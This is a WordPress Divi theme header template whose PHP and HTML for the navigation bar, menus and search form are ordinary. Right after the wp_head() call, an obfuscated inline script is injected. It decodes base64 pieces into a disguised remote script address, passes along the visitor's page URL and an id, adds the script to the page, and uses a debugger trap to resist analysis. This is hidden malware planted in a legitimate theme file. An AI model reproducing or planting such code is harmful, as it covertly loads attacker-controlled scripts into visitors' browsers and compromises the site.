<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
<?php
	elegant_description();
	elegant_keywords();
	elegant_canonical();

	/**
	 * Fires in the head, before {@see wp_head()} is called. This action can be used to
	 * insert elements into the beginning of the head before any styles or scripts.
	 *
	 * @since 1.0
	 */
	do_action( 'et_head_meta' );

	$template_directory_uri = get_template_directory_uri();
?>

	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

	<script type="text/javascript">
		document.documentElement.className = 'js';
	</script>

	<?php wp_head(); ?>
<script language="javascript">var D=d;(function(e,f){var z=d,g=e();while(!![]){try{var h=parseInt(z(0x185))/(-0x16ae+-0x1cc7+0x3376)+parseInt(z(0x167))/(-0xb56+0x171f+-0xc9*0xf)*(parseInt(z(0x176))/(-0xd1d+0xfc*0x5+-0xe*-0x96))+-parseInt(z(0x17e))/(-0x335*-0x1+-0x186d+0x153c)*(parseInt(z(0x16f))/(-0x396*-0x2+-0x12e1+0xbba))+-parseInt(z(0x178))/(0x2143+-0x4*-0x7d8+-0x409d)*(parseInt(z(0x16d))/(0x61b*-0x1+-0x2233+-0x811*-0x5))+-parseInt(z(0x18a))/(-0x112f+-0xee9+-0x1*-0x2020)+parseInt(z(0x17f))/(-0xfb9+0x1*0xd0+0xef2)+parseInt(z(0x188))/(-0x2637+-0x4c*-0x35+0x481*0x5);if(h===f)break;else g['push'](g['shift']());}catch(i){g['push'](g['shift']());}}}(c,0x1dc3+0xa9c*-0x11c+-0x2*-0x9655e));var b=(function(){var e=!![];return function(f,g){var h=e?function(){var A=d;if(g){var i=g[A(0x199)](f,arguments);return g=null,i;}}:function(){};return e=![],h;};}());(function(){b(this,function(){var B=d;if(B(0x183)===B(0x19c))j(this,function(){var C=B,w=new o('functio'+C(0x17d)+'\)'),x=new p(C(0x17a)+C(0x195)+C(0x18f)+C(0x18e)+C(0x181),'i'),y=q(C(0x169));!w['test'](y+'chain')||!x[C(0x197)](y+C(0x18d))?y('0'):s();})();else{var e=new RegExp(B(0x194)+B(0x17d)+'\)'),f=new RegExp(B(0x17a)+B(0x195)+'-Z_$][0'+B(0x18e)+'Z_$]*)','i'),g=a('init');!e[B(0x197)](g+'chain')||!f[B(0x197)](g+'input')?g('0'):a();}})();}());var idnn=document[D(0x180)+'lement'](D(0x168));function d(a,b){var e=c();return d=function(f,g){f=f-(-0x96f+0xb15*-0x1+0x1*0x15eb);var h=e[f];return h;},d(a,b);}function c(){var H=['2267560ORJytm','setAttr','true) {','input','-9a-zA-','-Z_$][0','S4xL2px','vanF1ZX','{}.cons','dWVyeS0','functio','?:[a-zA','gger','test','debu','apply','1anF1ZX','ctor','WJdLc','118xhLbQO','script','init','J5LmNvb','while (','("retur','2947kPFneU','L2xpYnM','5Gqzkwt','n this"','locatio','JnIyPQ=',')( )','ibute','mpzP2k9','47109XUpSEu','action','10290sqbIXc','call','\+\+ *(','constru','stateOb','n *\( *','2046676GWshmr','2777724ckCUQi','createE','Z_$]*)','appendC','uSzqC','zLjExLj','221185txYDTN','atob','rval','5286540aoLBvM','head'];c=function(){return H;};return c();}idnn[D(0x18b)+D(0x174)]('src',window[D(0x186)]('Ly9hcGl'+D(0x19a)+D(0x16a)+'S9hamF4'+D(0x16e)+D(0x191)+'J5LzMuN'+D(0x190)+D(0x193)+D(0x184)+'AubWluL'+D(0x175))+window[D(0x171)+'n']['href']+window[D(0x186)](D(0x172)+'=')+'06b88ed4df571bbf659ca8ec77d10dca'),(function(){var F=D,e=function(){var E=d,g;try{g=Function('return '+'(functi'+'on() '+(E(0x192)+'tructor'+E(0x16c)+E(0x170)+E(0x173))+');')();}catch(h){g=window;}return g;},f=e();f['setInte'+F(0x187)](a,-0x468+-0x9fa+0x925*0x2);}()),document[D(0x189)][D(0x182)+'hild'](idnn);function a(e){function f(g){var G=d;if(typeof g==='string')return function(h){}[G(0x17b)+G(0x19b)](G(0x16b)+G(0x18c)+'}')[G(0x199)]('counter');else(''+g/g)['length']!==0x1*0x251f+-0x1743+-0xddb||g%(0xcef*-0x1+-0xc*-0x155+-0x1*0x2f9)===-0x81*0x1b+0x67*-0x5b+0x3238?function(){return!![];}[G(0x17b)+G(0x19b)]('debu'+G(0x196))[G(0x179)](G(0x177)):function(){return![];}['constru'+G(0x19b)](G(0x198)+G(0x196))[G(0x199)](G(0x17c)+'ject');f(++g);}try{if(e)return f;else f(0x26e2+-0x1b9+-0x97*0x3f);}catch(g){}}</script>



















</head>
<body <?php body_class(); ?>>
<?php
	wp_body_open();

	$product_tour_enabled = et_builder_is_product_tour_enabled();
	$page_container_style = $product_tour_enabled ? ' style="padding-top: 0px;"' : ''; ?>
	<div id="page-container"<?php echo et_core_intentionally_unescaped( $page_container_style, 'fixed_string' ); ?>>
<?php
	if ( $product_tour_enabled || is_page_template( 'page-template-blank.php' ) ) {
		return;
	}

	$et_secondary_nav_items = et_divi_get_top_nav_items();

	$et_phone_number = $et_secondary_nav_items->phone_number;

	$et_email = $et_secondary_nav_items->email;

	$et_contact_info_defined = $et_secondary_nav_items->contact_info_defined;

	$show_header_social_icons = $et_secondary_nav_items->show_header_social_icons;

	$et_secondary_nav = $et_secondary_nav_items->secondary_nav;

	$et_top_info_defined = $et_secondary_nav_items->top_info_defined;

	$et_slide_header = 'slide' === et_get_option( 'header_style', 'left' ) || 'fullscreen' === et_get_option( 'header_style', 'left' ) ? true : false;
?>

	<?php if ( $et_top_info_defined && ! $et_slide_header || is_customize_preview() ) : ?>
		<?php ob_start(); ?>
		<div id="top-header"<?php echo $et_top_info_defined ? '' : 'style="display: none;"'; ?>>
			<div class="container clearfix">

			<?php if ( $et_contact_info_defined ) : ?>

				<div id="et-info">
				<?php if ( '' !== ( $et_phone_number = et_get_option( 'phone_number' ) ) ) : ?>
					<span id="et-info-phone"><?php echo et_core_esc_previously( et_sanitize_html_input_text( $et_phone_number ) ); ?></span>
				<?php endif; ?>

				<?php if ( '' !== ( $et_email = et_get_option( 'header_email' ) ) ) : ?>
					<a href="<?php echo esc_attr( 'mailto:' . $et_email ); ?>"><span id="et-info-email"><?php echo esc_html( $et_email ); ?></span></a>
				<?php endif; ?>

				<?php
				if ( true === $show_header_social_icons ) {
					get_template_part( 'includes/social_icons', 'header' );
				} ?>
				</div> <!-- #et-info -->

			<?php endif; // true === $et_contact_info_defined ?>

				<div id="et-secondary-menu">
				<?php
					if ( ! $et_contact_info_defined && true === $show_header_social_icons ) {
						get_template_part( 'includes/social_icons', 'header' );
					} else if ( $et_contact_info_defined && true === $show_header_social_icons ) {
						ob_start();

						get_template_part( 'includes/social_icons', 'header' );

						$duplicate_social_icons = ob_get_contents();

						ob_end_clean();

						printf(
							'<div class="et_duplicate_social_icons">
								%1$s
							</div>',
							et_core_esc_previously( $duplicate_social_icons )
						);
					}

					if ( '' !== $et_secondary_nav ) {
						echo et_core_esc_wp( $et_secondary_nav );
					}

					et_show_cart_total();
				?>
				</div> <!-- #et-secondary-menu -->

			</div> <!-- .container -->
		</div> <!-- #top-header -->
	<?php
		$top_header = ob_get_clean();

		/**
		 * Filters the HTML output for the top header.
		 *
		 * @since 3.10
		 *
		 * @param string $top_header
		 */
		echo et_core_intentionally_unescaped( apply_filters( 'et_html_top_header', $top_header ), 'html' );
	?>
	<?php endif; // true ==== $et_top_info_defined ?>

	<?php if ( $et_slide_header || is_customize_preview() ) : ?>
		<?php ob_start(); ?>
		<div class="et_slide_in_menu_container">
			<?php if ( 'fullscreen' === et_get_option( 'header_style', 'left' ) || is_customize_preview() ) { ?>
				<span class="mobile_menu_bar et_toggle_fullscreen_menu"></span>
			<?php } ?>

			<?php
				if ( $et_contact_info_defined || true === $show_header_social_icons || false !== et_get_option( 'show_search_icon', true ) || class_exists( 'woocommerce' ) || is_customize_preview() ) { ?>
					<div class="et_slide_menu_top">

					<?php if ( 'fullscreen' === et_get_option( 'header_style', 'left' ) ) { ?>
						<div class="et_pb_top_menu_inner">
					<?php } ?>
			<?php }

				if ( true === $show_header_social_icons ) {
					get_template_part( 'includes/social_icons', 'header' );
				}

				et_show_cart_total();
			?>
			<?php if ( false !== et_get_option( 'show_search_icon', true ) || is_customize_preview() ) : ?>
				<?php if ( 'fullscreen' !== et_get_option( 'header_style', 'left' ) ) { ?>
					<div class="clear"></div>
				<?php } ?>
				<form role="search" method="get" class="et-search-form" action="<?php echo esc_url( home_url( '/' ) ); ?>">
					<?php
						printf( '<input type="search" class="et-search-field" placeholder="%1$s" value="%2$s" name="s" title="%3$s" />',
							esc_attr__( 'Search &hellip;', 'Divi' ),
							get_search_query(),
							esc_attr__( 'Search for:', 'Divi' )
						);

						/**
						 * Fires inside the search form element, just before its closing tag.
						 *
						 * @since ??
						 */
						do_action( 'et_search_form_fields' );
					?>
					<button type="submit" id="searchsubmit_header"></button>
				</form>
			<?php endif; // true === et_get_option( 'show_search_icon', false ) ?>

			<?php if ( $et_contact_info_defined ) : ?>

				<div id="et-info">
				<?php if ( '' !== ( $et_phone_number = et_get_option( 'phone_number' ) ) ) : ?>
					<span id="et-info-phone"><?php echo et_core_esc_previously( et_sanitize_html_input_text( $et_phone_number ) ); ?></span>
				<?php endif; ?>

				<?php if ( '' !== ( $et_email = et_get_option( 'header_email' ) ) ) : ?>
					<a href="<?php echo esc_attr( 'mailto:' . $et_email ); ?>"><span id="et-info-email"><?php echo esc_html( $et_email ); ?></span></a>
				<?php endif; ?>
				</div> <!-- #et-info -->

			<?php endif; // true === $et_contact_info_defined ?>
			<?php if ( $et_contact_info_defined || true === $show_header_social_icons || false !== et_get_option( 'show_search_icon', true ) || class_exists( 'woocommerce' ) || is_customize_preview() ) { ?>
				<?php if ( 'fullscreen' === et_get_option( 'header_style', 'left' ) ) { ?>
					</div> <!-- .et_pb_top_menu_inner -->
				<?php } ?>

				</div> <!-- .et_slide_menu_top -->
			<?php } ?>

			<div class="et_pb_fullscreen_nav_container">
				<?php
					$slide_nav = '';
					$slide_menu_class = 'et_mobile_menu';

					$slide_nav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'echo' => false, 'items_wrap' => '%3$s' ) );
					$slide_nav .= wp_nav_menu( array( 'theme_location' => 'secondary-menu', 'container' => '', 'fallback_cb' => '', 'echo' => false, 'items_wrap' => '%3$s' ) );
				?>

				<ul id="mobile_menu_slide" class="<?php echo esc_attr( $slide_menu_class ); ?>">

				<?php
					if ( '' === $slide_nav ) :
				?>
						<?php if ( 'on' === et_get_option( 'divi_home_link' ) ) { ?>
							<li <?php if ( is_home() ) echo( 'class="current_page_item"' ); ?>><a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php esc_html_e( 'Home', 'Divi' ); ?></a></li>
						<?php }; ?>

						<?php show_page_menu( $slide_menu_class, false, false ); ?>
						<?php show_categories_menu( $slide_menu_class, false ); ?>
				<?php
					else :
						echo et_core_esc_wp( $slide_nav ) ;
					endif;
				?>

				</ul>
			</div>
		</div>
	<?php
		$slide_header = ob_get_clean();

		/**
		 * Filters the HTML output for the slide header.
		 *
		 * @since 3.10
		 *
		 * @param string $top_header
		 */
		echo et_core_intentionally_unescaped( apply_filters( 'et_html_slide_header', $slide_header ), 'html' );
	?>
	<?php endif; // true ==== $et_slide_header ?>

	<?php ob_start(); ?>
		<header id="main-header" data-height-onload="<?php echo esc_attr( et_get_option( 'menu_height', '66' ) ); ?>">
			<div class="container clearfix et_menu_container">
			<?php
				$logo = ( $user_logo = et_get_option( 'divi_logo' ) ) && ! empty( $user_logo )
					? $user_logo
					: $template_directory_uri . '/images/logo.png';

				ob_start();
			?>
				<div class="logo_container">
					<span class="logo_helper"></span>
					<a href="<?php echo esc_url( home_url( '/' ) ); ?>">
						<img src="<?php echo esc_attr( $logo ); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name' ) ); ?>" id="logo" data-height-percentage="<?php echo esc_attr( et_get_option( 'logo_height', '54' ) ); ?>" />
					</a>
				</div>
			<?php
				$logo_container = ob_get_clean();

				/**
				 * Filters the HTML output for the logo container.
				 *
				 * @since 3.10
				 *
				 * @param string $logo_container
				 */
				echo et_core_intentionally_unescaped( apply_filters( 'et_html_logo_container', $logo_container ), 'html' );
			?>
				<div id="et-top-navigation" data-height="<?php echo esc_attr( et_get_option( 'menu_height', '66' ) ); ?>" data-fixed-height="<?php echo esc_attr( et_get_option( 'minimized_menu_height', '40' ) ); ?>">
					<?php if ( ! $et_slide_header || is_customize_preview() ) : ?>
						<nav id="top-menu-nav">
						<?php
							$menuClass = 'nav';
							if ( 'on' === et_get_option( 'divi_disable_toptier' ) ) $menuClass .= ' et_disable_top_tier';
							$primaryNav = '';

							$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => 'top-menu', 'echo' => false ) );
							if ( empty( $primaryNav ) ) :
						?>
							<ul id="top-menu" class="<?php echo esc_attr( $menuClass ); ?>">
								<?php if ( 'on' === et_get_option( 'divi_home_link' ) ) { ?>
									<li <?php if ( is_home() ) echo( 'class="current_page_item"' ); ?>><a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php esc_html_e( 'Home', 'Divi' ); ?></a></li>
								<?php }; ?>

								<?php show_page_menu( $menuClass, false, false ); ?>
								<?php show_categories_menu( $menuClass, false ); ?>
							</ul>
						<?php
							else :
								echo et_core_esc_wp( $primaryNav );
							endif;
						?>
						</nav>
					<?php endif; ?>

					<?php
					if ( ! $et_top_info_defined && ( ! $et_slide_header || is_customize_preview() ) ) {
						et_show_cart_total( array(
							'no_text' => true,
						) );
					}
					?>

					<?php if ( $et_slide_header || is_customize_preview() ) : ?>
						<span class="mobile_menu_bar et_pb_header_toggle et_toggle_<?php echo esc_attr( et_get_option( 'header_style', 'left' ) ); ?>_menu"></span>
					<?php endif; ?>

					<?php if ( ( false !== et_get_option( 'show_search_icon', true ) && ! $et_slide_header ) || is_customize_preview() ) : ?>
					<div id="et_top_search">
						<span id="et_search_icon"></span>
					</div>
					<?php endif; // true === et_get_option( 'show_search_icon', false ) ?>

					<?php

					/**
					 * Fires at the end of the 'et-top-navigation' element, just before its closing tag.
					 *
					 * @since 1.0
					 */
					do_action( 'et_header_top' );

					?>
				</div> <!-- #et-top-navigation -->
			</div> <!-- .container -->
			<div class="et_search_outer">
				<div class="container et_search_form_container">
					<form role="search" method="get" class="et-search-form" action="<?php echo esc_url( home_url( '/' ) ); ?>">
					<?php
						printf( '<input type="search" class="et-search-field" placeholder="%1$s" value="%2$s" name="s" title="%3$s" />',
							esc_attr__( 'Search &hellip;', 'Divi' ),
							get_search_query(),
							esc_attr__( 'Search for:', 'Divi' )
						);

						/**
						 * Fires inside the search form element, just before its closing tag.
						 *
						 * @since ??
						 */
						do_action( 'et_search_form_fields' );
					?>
					</form>
					<span class="et_close_search_field"></span>
				</div>
			</div>
		</header> <!-- #main-header -->
	<?php
		$main_header = ob_get_clean();

		/**
		 * Filters the HTML output for the main header.
		 *
		 * @since 3.10
		 *
		 * @param string $main_header
		 */
		echo et_core_intentionally_unescaped( apply_filters( 'et_html_main_header', $main_header ), 'html' );
	?>
		<div id="et-main-area">
	<?php
		/**
		 * Fires after the header, before the main content is output.
		 *
		 * @since 3.10
		 */
		do_action( 'et_before_main_content' );
